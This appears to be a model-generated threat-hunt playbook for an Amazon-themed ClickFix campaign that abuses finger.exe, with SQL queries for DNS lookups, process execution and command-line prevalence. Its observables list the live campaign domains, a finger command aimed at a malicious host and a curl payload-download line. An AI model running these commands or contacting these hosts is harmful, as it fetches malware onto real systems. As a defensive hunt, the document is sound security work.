---
analysis: A simple rule for finger.exe exists, but this hunt uses DNS infrastructure
  context, command-line obfuscation checks, and fleet-wide prevalence stacking to
  provide the triage context required to separate an exploit attempt from accidental
  or legacy usage.
blind_spots:
- id: no-finger-visibility
  question: Did the finger command successfully download the .plan payload?
  requires: network traffic monitoring for port 79
  risk: Many environments do not log traffic on port 79, making it difficult to confirm
    if the remote connection succeeded or what content was returned.
  stage: execution-finger-lolbin
- id: clipboard-pastejacking-blind-spot
  question: Was the command placed in the clipboard by the browser before execution?
  requires: hb_resource_activity with clipboard focus
  risk: Without clipboard monitoring, the link between the browser interaction and
    the manual command execution relies on temporal correlation.
  stage: execution-finger-lolbin
coverage:
- stage: initial-access-seo-lure
  status: covered
  steps:
  - dns-lead-campaign
- stage: execution-finger-lolbin
  status: covered
  steps:
  - finger-abuse-patterns
  - finger-cmdline-prevalence
- reason: Belongs to another part of the 'Amazon-Themed ClickFix Campaign Serves Up
    Finger-Licking Malware' series.
  stage: payload-delivery-ironpython
  status: out_of_scope
- reason: Belongs to another part of the 'Amazon-Themed ClickFix Campaign Serves Up
    Finger-Licking Malware' series.
  stage: loader-execution-doina
  status: out_of_scope
- reason: Belongs to another part of the 'Amazon-Themed ClickFix Campaign Serves Up
    Finger-Licking Malware' series.
  stage: persistence-node-js-deployment
  status: out_of_scope
- reason: Belongs to another part of the 'Amazon-Themed ClickFix Campaign Serves Up
    Finger-Licking Malware' series.
  stage: credential-access-lumma
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: The finger utility is a legacy tool with virtually no legitimate
    modern use. Its presence in command-line arguments, especially with obfuscation,
    is a high-fidelity indicator of the ClickFix campaign.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has lured a user to a spoofed Amazon page and pastejacked
  a command that uses finger.exe to download malicious payloads from a remote domain.
labels:
- hunt
- attack.t1190
- attack.t1218
- attack.t1071
- attack.t1115
- credential access
- defense evasion
- execution
- initial access
- persistence
name: Amazon ClickFix Finger Utility Abuse
parameters:
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-10-21'
      ref: standard-retention
    type: number
  malicious_domains:
    default:
    - orders-amazon.com.advancedfences.com
    - ashevilleroofingcontractor.com
    - grillrecipespro.com
    - grillmasterchef.com
    - kiriosyka.com
    description: Infrastructure domains identified in the ClickFix campaign.
    from:
      kind: article
      observed: '2026-10-21'
      ref: huntress-clickfix-finger
    type: list[domain]
  scope_hosts:
    default: []
    description: Hostnames found in the scoping query to focus the hunt; if empty,
      the entire estate is checked.
    from:
      kind: manual
      observed: '2026-10-21'
      ref: analyst-scoping
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/amazon-clickfix-finger
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Start with DNS resolutions to the lure domains, then look for any finger
  activity. Focus on Windows and macOS endpoints as the finger utility is a default
  binary on both platforms.
references:
- name: "Huntress \u2014 Amazon-Themed ClickFix Campaign Serves Up Finger-Licking\
    \ Malware"
  url: https://www.huntress.com/blog/amazon-clickfix-finger
related:
- hunt: payload-delivery-ironpython
  reason: This hunt focuses on the finger utility; the subsequent IronPython download
    and extraction stage belongs to a separate follow-on hunt.
  relation: out-of-scope-alternative
scenario:
  stages:
  - name: Amazon-themed SEO Poisoning
    observables:
    - orders-amazon.com.advancedfences.com
    - sites.google.com/view/ch-pc/sign-in
    - ashevilleroofingcontractor.com
    - 'Search keyword: ''amazon business'''
    slug: initial-access-seo-lure
    tactic: initial-access
    techniques:
    - T1190
  - name: Finger LOLbin Command Execution
    observables:
    - finger.exe
    - finger DLVBUCeFfF@grillrecipespro.com
    - 'Command line obfuscated with characters: ^ , - _'
    - Clipboard pastejacking via 'I'm not a robot' button
    slug: execution-finger-lolbin
    tactic: execution
    techniques:
    - T1218
    - T1115
  - name: IronPython Payload Staging
    observables:
    - curl -o %TEMP%\*.pdf github.com/IronLanguages/ironpython3/releases/download/v3.4.2/IronPython.3.4.2.zip
    - tar.exe
    - ipyw32.exe
    - IronPython.3.4.2.zip
    slug: payload-delivery-ironpython
    tactic: execution
    techniques:
    - T1218
  - name: Doina Malware Loader
    observables:
    - grillmasterchef.com/90e4a147-1234-505c-a024-062e543b5df8/timer6
    - grillmasterchef.com/90e4a147-1234-505c-a024-062e543b5df8/v6
    - Python script using Cyrillic character substitution for Base64
    - RC4 encrypted PE file 'v6'
    slug: loader-execution-doina
    tactic: defense-evasion
    techniques:
    - T1055.012
    - T1071
  - name: Node.js Environment Deployment
    observables:
    - C:\ProgramData\NodeView
    - kiriosyka.com/KsxmmKiN5N0j/sqr-viewertr6
    - node.exe
    - index.js
    - Unpacking 52MB ZIP containing portable Node.js
    slug: persistence-node-js-deployment
    tactic: persistence
    techniques:
    - T1071
  - name: Lumma Stealer Infostrealt
    observables:
    - Lumma Stealer memory injection via sRDI
    - Websocket beaconing
    - HTTPS POST profiling data containing hostname and username
    - Process hollowing into legitimate system processes
    slug: credential-access-lumma
    tactic: credential-access
    techniques:
    - T1555
    - T1055.012
    - T1071
  summary: A multi-stage ClickFix campaign uses sponsored Google search results for
    'Amazon Business' to lead victims to fake login pages and CAPTCHAs that trigger
    pastejacked commands. These commands abuse the 'finger' utility to download a
    convoluted sequence of loaders, including IronPython and Node.js, which ultimately
    deliver Doina malware and Lumma Stealer via process hollowing.
series:
  index: 1
  slug: amazon-themed-clickfix-campaign-serves-up-finger-licking-malware
  title: Amazon-Themed ClickFix Campaign Serves Up Finger-Licking Malware
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# Amazon ClickFix Finger Utility Abuse

Attackers use SEO poisoning to drive victims to a fake Amazon login page where a pastejacked command is copied to the clipboard. The command uses finger.exe to communicate with a remote server over port 79, retrieving a malicious script hidden within a .plan file. This hunt identifies the initial access and execution stages of a ClickFix campaign that uses the legacy finger.exe utility as a LOLbin. The hunt scopes for suspicious DNS resolutions to known campaign infrastructure, identifies obfuscated finger.exe executions, and uses a prevalence count to highlight rare command-line arguments across the environment.

## dns-lead-campaign
<!-- DNS resolutions to campaign domains -->
Identify hosts resolving the initial lure or delivery domains associated with the BBQ-themed infrastructure.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days, malicious_domains=malicious_domains)
~~~yaml
expected: A hostname resolving one of the reported domains. Silence indicates no interaction
  with the known infrastructure.
reads:
- device_hostname
- query_hostname
- process_name
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-10-22'
~~~
SELECT device_hostname, query_hostname, process_name, time FROM hb_dns_activity WHERE instr(',' || '{{malicious_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days')
```

## corroborate-finger-activity
<!-- Corroborate finger utility activity -->
parallel:
- → finger-abuse-patterns
- → finger-cmdline-prevalence
join: → triage-evidence

## finger-abuse-patterns
<!-- Obfuscated or remote finger execution -->
Find finger executions that include an @ symbol for remote connections or command-line obfuscation characters used in this campaign.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: A process row showing the finger utility targeting a remote user or using
  shell-escape characters. Silence is expected as finger is a legacy tool.
reads:
- device_hostname
- process_cmd_line
- parent_process_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-10-22'
~~~
SELECT device_hostname, process_cmd_line, parent_process_name, time FROM hb_process_activity WHERE (LOWER(process_name) LIKE '%finger' OR LOWER(process_name) LIKE '%finger.exe') AND (process_cmd_line LIKE '%@%' OR instr(process_cmd_line, '^') > 0 OR instr(process_cmd_line, ',') > 0 OR instr(process_cmd_line, '-') > 0 OR instr(process_cmd_line, '_') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## finger-cmdline-prevalence
<!-- Rare finger command lines -->
Stack-count finger command lines to identify rare or unique activity that deviates from standard administrative use.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Unique or rare finger commands that appear on only a few hosts. High counts
  likely indicate legacy scripts.
prevalence:
  by: device_hostname
  key:
  - process_cmd_line
  rare_below: 3
reads:
- process_cmd_line
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-10-22'
~~~
SELECT LOWER(process_cmd_line) AS cmd, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_process_activity WHERE (LOWER(process_name) LIKE '%finger' OR LOWER(process_name) LIKE '%finger.exe') AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY cmd HAVING hosts <= 3
```

## triage-evidence
<!-- Triage ClickFix evidence -->
```agent target=hunter
cite: required
context:
- dns-lead-campaign
- finger-abuse-patterns
- finger-cmdline-prevalence
max_iterations: 6
objective: Determine if a host resolving campaign DNS domains also executed a suspicious
  finger command. Explicitly verify that the DNS resolution to campaign domains occurred
  shortly before the finger execution on the same host, indicating a successful pastejacking
  attack.
success_criteria: A per-host verdict of malicious, suspicious, or benign citing the
  specific command line and domains.
tools:
- endpoint
```

## route-on-verdict
<!-- Route on verdict -->
if~: "the triage-evidence verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → contain-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: no-finger-visibility)
else: → close-out

## contain-host
<!-- Isolate host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host and collect any temporary files with a .pdf extension from the user's Temp directory.
```
→ analyst-review

## analyst-review
<!-- Analyst review -->
```manual target=analyst
Confirm if the finger utility retrieved a .plan file. Inspect C:\ProgramData for subfolders like NodeView or IronPython. Record whether the user visited the Google Sites lure.
```
→ close-out

## close-out
<!-- Close out -->
```manual target=analyst
Document the investigation. Recommend blocking TCP port 79 at the network perimeter.
```
→ end
